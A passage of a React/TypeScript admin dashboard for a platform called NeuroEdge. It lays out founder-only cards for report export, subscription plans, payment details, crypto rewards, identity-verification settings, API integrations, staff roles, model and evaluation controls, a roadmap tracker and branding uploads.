                const data = await postJson("/intelligence/export", {
                  question: intelligenceQuestion,
                  payload: {
                    format: "pdf",
                    title: "NeuroEdge Academic Report",
                    content: JSON.stringify(intelligenceOutput || { question: intelligenceQuestion }, null, 2),
                  },
                });
                setIntelligenceOutput(data);
                setIntelligenceExportPath(String(data?.export?.path || ""));
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "PDF export failed" });
              }
            }}
          >
            Export PDF
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/export", {
                  question: intelligenceQuestion,
                  payload: {
                    format: "word",
                    title: "NeuroEdge Academic Report",
                    content: JSON.stringify(intelligenceOutput || { question: intelligenceQuestion }, null, 2),
                  },
                });
                setIntelligenceOutput(data);
                setIntelligenceExportPath(String(data?.export?.path || ""));
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "Word export failed" });
              }
            }}
          >
            Export Word
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/export", {
                  question: intelligenceQuestion,
                  payload: {
                    format: "zip",
                    title: "NeuroEdge Academic Report",
                    content: JSON.stringify(intelligenceOutput || { question: intelligenceQuestion }, null, 2),
                  },
                });
                setIntelligenceOutput(data);
                setIntelligenceExportPath(String(data?.export?.path || ""));
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "ZIP export failed" });
              }
            }}
          >
            Export ZIP
          </button>
          {intelligenceExportPath ? (
            <button
              style={primary}
              onClick={() => window.open(`${apiBase}/intelligence/download?path=${encodeURIComponent(intelligenceExportPath)}`, "_blank")}
            >
              Download Export
            </button>
          ) : null}
        </div>
      </div>
      {intelligenceSvg ? (
        <div
          style={{ ...log, marginTop: 8 }}
          dangerouslySetInnerHTML={{ __html: intelligenceSvg }}
        />
      ) : null}
      <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 220, overflow: "auto", marginTop: 8 }}>
        {intelligenceOutput ? JSON.stringify(intelligenceOutput, null, 2) : "No intelligence output yet."}
      </pre>
    </Card>
  );

  const founderView = (
    <div style={grid}>
      {trainingStudioCard}
      {domainRegistryCard}
      {accessControlCard}
      {deviceProtectionCard}
      {aegisShieldCard}
      {creatorEngineCard}
      {cortexCoreCard}
      <Card title="Platform Analytics">
        <Stat label="Users" value={String(users.length)} />
        <Stat label="Requests" value={String(reqTotal)} />
        <Stat label="Token Usage" value={tokenTotal.toLocaleString()} />
        <Stat label="Estimated Revenue" value={`$${estRevenue}`} />
      </Card>
      <Card title="Subscription & Plan Control">
        {plans.map((p) => (
          <div key={p.id} style={row}>
            <span>{p.name} (${p.monthly}/mo, ${p.annual}/yr)</span>
            <button
              style={chip}
              onClick={async () => {
                if (p.active && !confirmSafeAction({ title: `${p.name} plan`, actionLabel: "disable" })) return;
                await callAction("/admin/dashboard/plans/toggle", { id: p.id });
              }}
            >
              {p.active ? "Disable" : "Enable"}
            </button>
          </div>
        ))}
        <button style={primary} onClick={addPlan}>+ Add Plan</button>
      </Card>
      <Card title="Payment Profile (Dashboard-Managed)">
        <input placeholder="Card holder" value={payment.cardHolder} onChange={(e) => setPayment((p) => ({ ...p, cardHolder: e.target.value }))} style={input} />
        <input placeholder="Card number" value={paymentDraftCard} onChange={(e) => setPaymentDraftCard(e.target.value)} style={input} />
        <div style={{ display: "flex", gap: 8 }}>
          <input placeholder="MM" value={payment.expMonth} onChange={(e) => setPayment((p) => ({ ...p, expMonth: e.target.value }))} style={input} />
          <input placeholder="YYYY" value={payment.expYear} onChange={(e) => setPayment((p) => ({ ...p, expYear: e.target.value }))} style={input} />
        </div>
        <input placeholder="Billing email" value={payment.billingEmail} onChange={(e) => setPayment((p) => ({ ...p, billingEmail: e.target.value }))} style={input} />
        <input placeholder="Country" value={payment.country} onChange={(e) => setPayment((p) => ({ ...p, country: e.target.value }))} style={input} />
        <input placeholder="Tax ID (optional)" value={payment.taxId} onChange={(e) => setPayment((p) => ({ ...p, taxId: e.target.value }))} style={input} />
        <div style={muted}>Stored card: {payment.cardNumberMasked || "not set"}</div>
        <button style={primary} onClick={savePaymentDetails}>Save Payment Details</button>
      </Card>
      <Card title="Compute Donation Rewards (Crypto Wallet)">
        <div style={row}>
          <span>Enable rewards</span>
          <button
            style={chip}
            onClick={() => setCryptoRewards((p) => ({ ...p, enabled: !p.enabled }))}
          >
            {cryptoRewards.enabled ? "Enabled" : "Disabled"}
          </button>
        </div>
        <div style={{ display: "flex", gap: 8 }}>
          <input
            value={cryptoRewards.chain}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, chain: e.target.value }))}
            placeholder="Chain"
            style={input}
          />
          <input
            value={cryptoRewards.token}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, token: e.target.value }))}
            placeholder="Token"
            style={input}
          />
        </div>
        <input
          value={cryptoRewards.founderWalletAddress}
          onChange={(e) => setCryptoRewards((p) => ({ ...p, founderWalletAddress: e.target.value }))}
          placeholder="Founder wallet address"
          style={input}
        />
        <div style={{ display: "flex", gap: 8 }}>
          <input
            value={cryptoRewards.rewardPerComputeUnit}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, rewardPerComputeUnit: e.target.value }))}
            placeholder="Reward per compute unit"
            style={input}
          />
          <input
            value={cryptoRewards.minPayout}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, minPayout: e.target.value }))}
            placeholder="Minimum payout"
            style={input}
          />
        </div>
        <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
          <select
            value={cryptoRewards.payoutSchedule}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, payoutSchedule: e.target.value as CryptoRewardsConfig["payoutSchedule"] }))}
            style={input}
          >
            <option value="hourly">hourly</option>
            <option value="daily">daily</option>
            <option value="weekly">weekly</option>
            <option value="monthly">monthly</option>
          </select>
          <input
            type="number"
            value={cryptoRewards.treasuryAllocationPct}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, treasuryAllocationPct: Number(e.target.value) || 0 }))}
            placeholder="Treasury %"
            style={input}
          />
        </div>
        <div style={row}>
          <span>Donor bonus</span>
          <button
            style={chip}
            onClick={() => setCryptoRewards((p) => ({ ...p, donorBonusEnabled: !p.donorBonusEnabled }))}
          >
            {cryptoRewards.donorBonusEnabled ? "Enabled" : "Disabled"}
          </button>
        </div>
        <textarea
          value={cryptoRewards.notes}
          onChange={(e) => setCryptoRewards((p) => ({ ...p, notes: e.target.value }))}
          placeholder="Notes and payout policy"
          style={{ ...input, minHeight: 80 }}
        />
        <div style={muted}>
          Ready state: stores compute donation reward policy and payout wallet config for transparent reward accounting.
        </div>
        <button style={primary} onClick={saveCryptoRewards}>Save Crypto Rewards</button>
      </Card>
      <Card title="Rewards Wallets (Points → Cash/WDC Ready)">
        <div style={{ display: "grid", gap: 8 }}>
          <div style={{ display: "flex", gap: 8 }}>
            <input value={rewardUserId} onChange={(e) => setRewardUserId(e.target.value)} placeholder="User ID" style={input} />
            <input value={rewardUserName} onChange={(e) => setRewardUserName(e.target.value)} placeholder="User name" style={input} />
            <input value={rewardPointsInput} onChange={(e) => setRewardPointsInput(e.target.value)} placeholder="Points" style={input} />
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <button style={primary} onClick={creditPoints}>Credit Points</button>
            <button style={chip} onClick={debitPoints}>Debit Points</button>
            <button style={chip} onClick={() => convertPoints("cash")}>Convert → Cash</button>
            <button style={chip} onClick={() => convertPoints("wdc")}>Convert → WDC</button>
          </div>
          <div style={{ display: "flex", gap: 8 }}>
            <input
              type="number"
              value={rewardsLedger.config.pointsPerUsd}
              onChange={(e) =>
                setRewardsLedger((p) => ({ ...p, config: { ...p.config, pointsPerUsd: Number(e.target.value) || 1 } }))
              }
              placeholder="Points per USD"
              style={input}
            />
            <input
              type="number"
              step="0.000001"
              value={rewardsLedger.config.wdcPerPoint}
              onChange={(e) =>
                setRewardsLedger((p) => ({ ...p, config: { ...p.config, wdcPerPoint: Number(e.target.value) || 0 } }))
              }
              placeholder="WDC per point"
              style={input}
            />
            <select
              value={rewardsLedger.config.payoutMode}
              onChange={(e) =>
                setRewardsLedger((p) => ({
                  ...p,
                  config: { ...p.config, payoutMode: e.target.value as RewardsLedger["config"]["payoutMode"] },
                }))
              }
              style={input}
            >
              <option value="points_only">points_only</option>
              <option value="cash_only">cash_only</option>
              <option value="wdc_only">wdc_only</option>
              <option value="hybrid">hybrid</option>
            </select>
          </div>
          <div style={row}>
            <span>WDC listing live</span>
            <button
              style={chip}
              onClick={() =>
                setRewardsLedger((p) => ({
                  ...p,
                  config: { ...p.config, wdcListingLive: !p.config.wdcListingLive },
                }))
              }
            >
              {rewardsLedger.config.wdcListingLive ? "Enabled" : "Disabled"}
            </button>
          </div>
          <button style={primary} onClick={saveRewardsConfig}>Save Conversion Config</button>
        </div>
        <div style={{ display: "grid", gap: 8, marginTop: 8 }}>
          {rewardsLedger.wallets.length === 0 && <div style={muted}>No reward wallets yet.</div>}
          {rewardsLedger.wallets.map((w) => (
            <div key={w.userId} style={log}>
              <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
                <strong>{w.userName} ({w.userId})</strong>
                <span>{new Date(w.updatedAt || Date.now()).toLocaleString()}</span>
              </div>
              <div>Points: {Number(w.points || 0).toLocaleString()} • Total Earned: {Number(w.totalEarnedPoints || 0).toLocaleString()}</div>
              <div>Pending Cash: ${Number(w.pendingCashUsd || 0).toFixed(2)} • Pending WDC: {Number(w.pendingWdc || 0).toFixed(6)}</div>
            </div>
          ))}
        </div>
      </Card>
      <Card title="IDVerse Identity Bridge">
        <div style={row}>
          <span>Enabled</span>
          <button style={chip} onClick={() => setIdverseConfig((p) => ({ ...p, enabled: !p.enabled }))}>
            {idverseConfig.enabled ? "Enabled" : "Disabled"}
          </button>
        </div>
        <input
          value={idverseConfig.baseUrl}
          onChange={(e) => setIdverseConfig((p) => ({ ...p, baseUrl: e.target.value }))}
          placeholder="IDVerse base URL (https://...)"
          style={input}
        />
        <input
          value={idverseConfig.projectId}
          onChange={(e) => setIdverseConfig((p) => ({ ...p, projectId: e.target.value }))}
          placeholder="Project ID"
          style={input}
        />
        <input
          value={idverseConfig.apiKey}
          onChange={(e) => setIdverseConfig((p) => ({ ...p, apiKey: e.target.value }))}
          placeholder={idverseConfig.apiKeyMasked ? `API Key (${idverseConfig.apiKeyMasked})` : "IDVerse API key"}
          style={input}
        />
        <div style={{ display: "flex", gap: 8 }}>
          <input
            type="number"
            value={idverseConfig.timeoutMs}
            onChange={(e) => setIdverseConfig((p) => ({ ...p, timeoutMs: Number(e.target.value) || 12000 }))}
            placeholder="Timeout ms"
            style={input}
          />
          <button style={chip} onClick={() => setIdverseConfig((p) => ({ ...p, strictBiometric: !p.strictBiometric }))}>
            Biometrics: {idverseConfig.strictBiometric ? "strict" : "relaxed"}
          </button>
          <button style={chip} onClick={() => setIdverseConfig((p) => ({ ...p, strictLiveness: !p.strictLiveness }))}>
            Liveness: {idverseConfig.strictLiveness ? "strict" : "relaxed"}
          </button>
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={saveIdverseConfig}>Save IDVerse Config</button>
          <button style={chip} onClick={checkIdverseStatus}>Check Status</button>
          <button style={chip} onClick={runIdverseVerifySample}>Run Verify Sample</button>
        </div>
        {idverseStatus && (
          <div style={log}>
            <pre style={{ margin: 0, whiteSpace: "pre-wrap" }}>{JSON.stringify(idverseStatus, null, 2)}</pre>
          </div>
        )}
      </Card>
      <Card title="Integrations & API Platform (Founder Premium)">
        <div style={{ display: "grid", gap: 8 }}>
          <input
            value={integrationDraft.appName}
            onChange={(e) => setIntegrationDraft((p) => ({ ...p, appName: e.target.value }))}
            placeholder="App name (e.g. afyalink)"
            style={input}
          />
          <textarea
            value={integrationDraft.appDescription}
            onChange={(e) => setIntegrationDraft((p) => ({ ...p, appDescription: e.target.value }))}
            placeholder="App details / what it needs from NeuroEdge"
            style={{ ...input, minHeight: 70 }}
          />
          <div style={{ display: "flex", gap: 8 }}>
            <select
              value={integrationDraft.environment}
              onChange={(e) => setIntegrationDraft((p) => ({ ...p, environment: e.target.value as IntegrationApp["environment"] }))}
              style={input}
            >
              <option value="development">development</option>
              <option value="staging">staging</option>
              <option value="production">production</option>
            </select>
            <input
              value={integrationDraft.rateLimitPerMin}
              onChange={(e) => setIntegrationDraft((p) => ({ ...p, rateLimitPerMin: e.target.value }))}
              placeholder="Rate limit/min"
              style={input}
            />
          </div>
          <input
            value={integrationDraft.scopesCsv}
            onChange={(e) => setIntegrationDraft((p) => ({ ...p, scopesCsv: e.target.value }))}
            placeholder="Scopes (comma-separated): chat:write, ai:infer, execute:run"
            style={input}
          />
          <input
            value={integrationDraft.originsCsv}
            onChange={(e) => setIntegrationDraft((p) => ({ ...p, originsCsv: e.target.value }))}
            placeholder="Allowed origins (comma-separated)"
            style={input}
          />
          <input
            value={integrationDraft.webhookUrl}
            onChange={(e) => setIntegrationDraft((p) => ({ ...p, webhookUrl: e.target.value }))}
            placeholder="Webhook URL"
            style={input}
          />
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={createIntegration}>Create Integration + Key</button>
          <button style={chip} onClick={requestPaidIntegrationKey}>Request Paid User Key</button>
        </div>
        {!!latestGeneratedApiKey && (
          <div style={log}>
            <div style={{ marginBottom: 6 }}>Generated API Key</div>
            <code style={{ fontSize: "0.78rem", wordBreak: "break-all" }}>{latestGeneratedApiKey}</code>
            <div style={{ marginTop: 8 }}>
              <button style={chip} onClick={() => navigator.clipboard?.writeText(latestGeneratedApiKey)}>Copy API Key</button>
            </div>
          </div>
        )}
        <div style={{ display: "grid", gap: 8 }}>
          {integrations.map((it) => (
            <div key={it.id} style={log}>
              <div style={{ display: "flex", justifyContent: "space-between", gap: 8, alignItems: "center" }}>
                <strong>{it.appName}</strong>
                <span>{it.environment} • {it.status}</span>
              </div>
              <div style={{ marginTop: 4, color: "#94a3b8" }}>{it.appDescription || "No description."}</div>
              <div style={{ marginTop: 4 }}>Scopes: {(it.scopes || []).join(", ") || "-"}</div>
              <div>Key: {it.keyMasked || (it.apiKey ? `${it.apiKey.slice(0, 6)}...${it.apiKey.slice(-4)}` : "not set")}</div>
              <div style={{ marginTop: 8, display: "flex", gap: 6, flexWrap: "wrap" }}>
                {it.apiKey && (
                  <button style={chip} onClick={() => navigator.clipboard?.writeText(it.apiKey || "")}>Copy Key</button>
                )}
                <button
                  style={chip}
                  onClick={() =>
                    callAction("/admin/dashboard/integrations/upsert", {
                      integration: {
                        ...it,
                        status: it.status === "active" ? "paused" : "active",
                      },
                    })
                  }
                >
                  {it.status === "active" ? "Pause" : "Activate"}
                </button>
                <button
                  style={chip}
                  onClick={() =>
                    runGuarded(`integration ${it.appName}`, () => callAction("/admin/dashboard/integrations/delete", { id: it.id }), "delete")
                  }
                >
                  Delete
                </button>
              </div>
            </div>
          ))}
          {integrations.length === 0 && <div style={muted}>No integrations yet. Create your first app connection.</div>}
        </div>
      </Card>
      <Card title="Role Governance">
        <div style={log}>
          <div style={{ fontWeight: 700, marginBottom: 8 }}>Founder Staff Registration (GoldegeLabs devices only)</div>
          <div style={{ display: "grid", gap: 8 }}>
            <input value={staffName} onChange={(e) => setStaffName(e.target.value)} placeholder="Staff full name" style={input} />
            <input value={staffEmail} onChange={(e) => setStaffEmail(e.target.value)} placeholder="Staff email" style={input} />
            <div style={{ display: "flex", gap: 8 }}>
              <select value={staffRole} onChange={(e) => setStaffRole(e.target.value as "admin" | "developer")} style={input}>
                <option value="admin">admin</option>
                <option value="developer">developer</option>
              </select>
              <input
                value={staffDeviceId}
                onChange={(e) => setStaffDeviceId(e.target.value)}
                placeholder={`Device ID (leave blank to auto-use ${localDeviceId()})`}
                style={input}
              />
            </div>
            <button style={primary} onClick={registerStaffUser}>Register Staff + Bind Device</button>
          </div>
        </div>
        {users.map((u) => (
          <div key={u.id} style={row}>
            <span>
              {u.name} ({u.role}) • {u.status}
              {u.founderRegistered ? " • founder-registered" : ""}
              {u.companyOwnedOnly ? " • company-device-only" : ""}
            </span>
            <div style={{ display: "flex", gap: 6 }}>
              <select value={u.role} onChange={(e) => assignRole(u.id, e.target.value as UserRecord["role"])} style={{ ...input, width: 130 }}>
                <option value="user">user</option>
                <option value="moderator">moderator</option>
                <option value="admin">admin</option>
                <option value="developer">developer</option>
                <option value="founder">founder</option>
              </select>
              <button style={chip} onClick={() => setStaffAccess(u.id, "allow")}>Allow</button>
              <button style={chip} onClick={() => setStaffAccess(u.id, "suspend")}>Suspend</button>
              <button style={chip} onClick={() => setStaffAccess(u.id, "revoke")}>Revoke</button>
              <button style={chip} onClick={() => bindStaffDevice(u.id, localDeviceId())}>Bind This Device</button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Model Control">
        <select value={modelControl.model} onChange={(e) => setModelControl((p) => ({ ...p, model: e.target.value }))} style={input}>
          <option value="neuroedge-7b-instruct">neuroedge-7b-instruct</option>
          <option value="neuroedge-13b-instruct">neuroedge-13b-instruct</option>
          <option value="neuroedge-70b-router">neuroedge-70b-router</option>
        </select>
        <input type="number" value={modelControl.temperature} onChange={(e) => setModelControl((p) => ({ ...p, temperature: Number(e.target.value) || 0 }))} style={input} />
        <input type="number" value={modelControl.maxTokens} onChange={(e) => setModelControl((p) => ({ ...p, maxTokens: Number(e.target.value) || 1024 }))} style={input} />
        <select value={modelControl.safetyMode} onChange={(e) => setModelControl((p) => ({ ...p, safetyMode: e.target.value as ModelControl["safetyMode"] }))} style={input}>
          <option value="strict">strict</option>
          <option value="balanced">balanced</option>
          <option value="open">open</option>
        </select>
        <button style={primary} onClick={saveModelControl}>Save Model Control</button>
      </Card>
      <Card title="Feature Flags">
        {Object.keys(featureFlags).map((k) => (
          <div key={k} style={row}>
            <span>{k}</span>
            <button style={chip} onClick={() => toggleFlag(k)}>
              {featureFlags[k] ? "Enabled" : "Disabled"}
            </button>
          </div>
        ))}
      </Card>
      <Card title="Quality Command Center (Founder/Admin)">
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={runQualityHardening}>Run Full Hardening</button>
          <button style={chip} onClick={runQualityBatch}>Run Eval Batch</button>
          <button style={chip} onClick={runQualityRedTeam}>Run Red-Team</button>
          <button style={chip} onClick={refreshQualityInsights}>Refresh Quality Signals</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/trust/consistency?windowHours=72")}>Trust Consistency</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/quality/benchmark/trends?windowDays=30")}>Benchmark Trends</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/quality/benchmark/regression?windowDays=30")}>Regression Check</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/sre/concurrency")}>SRE Concurrency</button>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(2, minmax(180px, 1fr))", gap: 8, marginTop: 8 }}>
          <Stat label="Eval Cases" value={String(qualityEvalCoverage?.totalCases || 0)} />
          <Stat label="Red-Team Cases" value={String(qualityEvalCoverage?.redTeamCases || 0)} />
          <Stat label="Reliability p95 (ms)" value={String(qualityReliability?.p95LatencyMs || 0)} />
          <Stat label="Success Rate" value={qualityReliability?.successRate !== undefined ? `${Number(qualityReliability.successRate * 100).toFixed(1)}%` : "0%"} />
          <Stat label="Citation Coverage" value={qualityTrust?.citationCoverageRate !== undefined ? `${Number(qualityTrust.citationCoverageRate * 100).toFixed(1)}%` : "0%"} />
          <Stat label="Hallucination Risk" value={qualityTrust?.hallucinationRiskScore !== undefined ? String(qualityTrust.hallucinationRiskScore) : "0"} />
          <Stat label="Stale Citation Rate" value={qualityRetrieval?.staleCitationRate !== undefined ? `${Number(qualityRetrieval.staleCitationRate * 100).toFixed(1)}%` : "0%"} />
          <Stat label="Model Outcome Events" value={String(qualityModelSummary?.outcomes?.totalEvents || 0)} />
        </div>
        <div style={{ marginTop: 8, fontWeight: 700 }}>Model Router Variants</div>
        <textarea
          value={modelRouterDraft}
          onChange={(e) => setModelRouterDraft(e.target.value)}
          placeholder='[{"id":"neuroedge-7b-instruct","weight":70,"domains":["general"],"enabled":true}]'
          style={{ ...input, minHeight: 120, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" }}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={saveModelRouterFromDashboard}>Save Router</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/model-quality/summary")}>Open Model Summary JSON</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/evals/latest?limit=10")}>Latest Evals</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/redteam/latest?limit=10")}>Latest Red-Team</button>
        </div>
        <div style={{ marginTop: 8, fontWeight: 700 }}>Benchmark Baselines</div>
        <textarea
          value={benchmarkBaselinesDraft}
          onChange={(e) => setBenchmarkBaselinesDraft(e.target.value)}
          placeholder='[{"suite":"core","minAccuracy":0.82,"maxP95LatencyMs":2500}]'
          style={{ ...input, minHeight: 110, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" }}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={saveBenchmarkBaselinesFromDashboard}>Save Baselines</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/quality/benchmark/baselines")}>Load Baselines</button>
        </div>
      </Card>
      <Card title="Frontier Program Roadmap (Founder/Admin)">
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={refreshFrontierProgram}>Refresh Program</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/frontier-program/readiness")}>Open Readiness JSON</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/frontier-program")}>Open Program JSON</button>
          <button style={chip} onClick={resetFrontierProgramFromDashboard}>Reset Program</button>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(180px, 1fr))", gap: 8, marginTop: 8 }}>
          <Stat label="Readiness Gate" value={frontierReadiness?.gate ? "pass" : "hold"} />
          <Stat label="Readiness Score" value={frontierReadiness?.readinessScore !== undefined ? `${Number(frontierReadiness.readinessScore * 100).toFixed(1)}%` : "0%"} />
          <Stat label="Blocked Items" value={String(frontierReadiness?.totals?.blocked || 0)} />
          <Stat label="Total Items" value={String(frontierReadiness?.totals?.items || frontierProgram?.items?.length || 0)} />
          <Stat label="Done Items" value={String(frontierReadiness?.totals?.done || 0)} />
          <Stat label="Critical Done" value={`${frontierReadiness?.totals?.criticalDone || 0}/${frontierReadiness?.totals?.criticalTotal || 0}`} />
        </div>
        <div style={{ marginTop: 8, fontSize: 13, opacity: 0.9 }}>
          {frontierReadiness?.recommendation || "Frontier readiness recommendation will appear here after refresh."}
        </div>

        <div style={{ marginTop: 10, fontWeight: 700 }}>Update Single Item</div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(180px, 1fr))", gap: 8 }}>
          <input value={frontierItemId} onChange={(e) => setFrontierItemId(e.target.value)} placeholder="Item ID (model_core_01)" style={input} />
          <input value={frontierItemOwner} onChange={(e) => setFrontierItemOwner(e.target.value)} placeholder="Owner" style={input} />
          <select value={frontierItemStatus} onChange={(e) => setFrontierItemStatus(e.target.value as any)} style={input}>
            <option value="planned">planned</option>
            <option value="in_progress">in_progress</option>
            <option value="blocked">blocked</option>
            <option value="done">done</option>
          </select>
          <select value={frontierItemPriority} onChange={(e) => setFrontierItemPriority(e.target.value as any)} style={input}>
            <option value="critical">critical</option>
            <option value="high">high</option>
            <option value="medium">medium</option>
            <option value="low">low</option>
          </select>
          <input value={frontierItemNotes} onChange={(e) => setFrontierItemNotes(e.target.value)} placeholder="Notes" style={{ ...input, gridColumn: "span 2" }} />
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
          <button style={primary} onClick={upsertFrontierItemFromDashboard}>Save Item</button>
        </div>

        <div style={{ marginTop: 10, fontWeight: 700 }}>Bulk Item Update</div>
        <textarea
          value={frontierBulkIds}
          onChange={(e) => setFrontierBulkIds(e.target.value)}
          placeholder={"Item IDs (comma/newline separated)\nmodel_core_01\neval_03\nsre_02"}
          style={{ ...input, minHeight: 72 }}
        />
        <div style={{ display: "grid", gridTemplateColumns: "repeat(2, minmax(180px, 1fr))", gap: 8 }}>
          <select value={frontierBulkStatus} onChange={(e) => setFrontierBulkStatus(e.target.value as any)} style={input}>
            <option value="planned">planned</option>
            <option value="in_progress">in_progress</option>
            <option value="blocked">blocked</option>
            <option value="done">done</option>
          </select>
          <button style={chip} onClick={bulkUpdateFrontierItemsFromDashboard}>Apply Bulk Update</button>
        </div>

        <div style={{ marginTop: 10, fontWeight: 700 }}>Milestones</div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(2, minmax(180px, 1fr))", gap: 8 }}>
          <input value={frontierMilestoneId} onChange={(e) => setFrontierMilestoneId(e.target.value)} placeholder="Milestone ID" style={input} />
          <input value={frontierMilestoneName} onChange={(e) => setFrontierMilestoneName(e.target.value)} placeholder="Milestone Name" style={input} />
          <input value={frontierMilestoneQuarter} onChange={(e) => setFrontierMilestoneQuarter(e.target.value)} placeholder="Quarter (Q2-2026)" style={input} />
          <input value={frontierMilestoneOwner} onChange={(e) => setFrontierMilestoneOwner(e.target.value)} placeholder="Owner" style={input} />
          <select value={frontierMilestoneStatus} onChange={(e) => setFrontierMilestoneStatus(e.target.value as any)} style={input}>
            <option value="planned">planned</option>
            <option value="in_progress">in_progress</option>
            <option value="blocked">blocked</option>
            <option value="done">done</option>
          </select>
        </div>
        <textarea
          value={frontierMilestoneCriteria}
          onChange={(e) => setFrontierMilestoneCriteria(e.target.value)}
          placeholder={"Success criteria (one per line)\nNightly eval active\nRegression gate passing"}
          style={{ ...input, minHeight: 72 }}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
          <button style={chip} onClick={upsertFrontierMilestoneFromDashboard}>Save Milestone</button>
        </div>

        <div style={{ marginTop: 10, fontWeight: 700 }}>Roadmap Snapshot</div>
        <div style={{ display: "grid", gap: 6, maxHeight: 220, overflowY: "auto", paddingRight: 4 }}>
          {(frontierProgram?.items || []).slice(0, 24).map((item) => (
            <div key={item.id} style={{ ...row, alignItems: "flex-start", border: "1px solid rgba(148,163,184,0.25)", borderRadius: 8, padding: 8 }}>
              <div style={{ flex: 1 }}>
                <div style={{ fontWeight: 700 }}>{item.id} • {item.title}</div>
                <div style={{ fontSize: 12, opacity: 0.85 }}>{item.group} • {item.priority} • {item.status} • {item.targetQuarter} • {item.owner}</div>
              </div>
              <button
                style={chip}
                onClick={async () => {
                  setFrontierItemId(item.id);
                  setFrontierItemOwner(item.owner || "founder");
                  setFrontierItemPriority((item.priority as any) || "high");
                  setFrontierItemStatus((item.status as any) || "planned");
                  setFrontierItemNotes(item.notes || "");
                }}
              >
                Edit
              </button>
            </div>
          ))}
          {(!frontierProgram || (frontierProgram.items || []).length === 0) && (
            <div style={{ opacity: 0.8 }}>No frontier items loaded yet.</div>
          )}
        </div>
      </Card>
      <Card title="Branding Studio (Founder/System Admin)">
        <input
          value={brandingDraft.productName}
          onChange={(e) => setBrandingDraft((p) => ({ ...p, productName: e.target.value }))}
          placeholder="Product name"
          style={input}
        />
        <div style={{ display: "grid", gap: 8 }}>
          <div style={row}>
            <span>Logo</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("logoUrl", e.target.files)} />
            </label>
          </div>
          <div style={row}>
            <span>Icon</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("iconUrl", e.target.files)} />
            </label>
          </div>
          <div style={row}>
            <span>Favicon</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("faviconUrl", e.target.files)} />
            </label>
          </div>
          <div style={row}>
            <span>Main Chat Background</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("mainChatBackgroundUrl", e.target.files)} />
            </label>
          </div>
          <div style={row}>
            <span>Floating Chat Background</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("floatingChatBackgroundUrl", e.target.files)} />
            </label>
          </div>
          <div style={row}>
            <span>Login Background</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("loginBackgroundUrl", e.target.files)} />
            </label>
          </div>
        </div>
        <div style={{ display: "flex", gap: 10, alignItems: "center", flexWrap: "wrap" }}>
          <img src={brandingDraft.logoUrl || defaultBranding.logoUrl} alt="logo preview" style={{ width: 56, height: 56, objectFit: "cover", borderRadius: 8, border: "1px solid rgba(148,163,184,0.35)" }} />
          <img src={brandingDraft.iconUrl || defaultBranding.iconUrl} alt="icon preview" style={{ width: 32, height: 32, objectFit: "cover", borderRadius: 6, border: "1px solid rgba(148,163,184,0.35)" }} />
          <img src={brandingDraft.faviconUrl || defaultBranding.faviconUrl} alt="favicon preview" style={{ width: 20, height: 20, objectFit: "cover", borderRadius: 4, border: "1px solid rgba(148,163,184,0.35)" }} />
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(120px, 1fr))", gap: 8 }}>
          <img src={brandingDraft.mainChatBackgroundUrl || defaultBranding.logoUrl} alt="main chat bg preview" style={{ width: "100%", height: 78, objectFit: "cover", borderRadius: 8, border: "1px solid rgba(148,163,184,0.35)" }} />
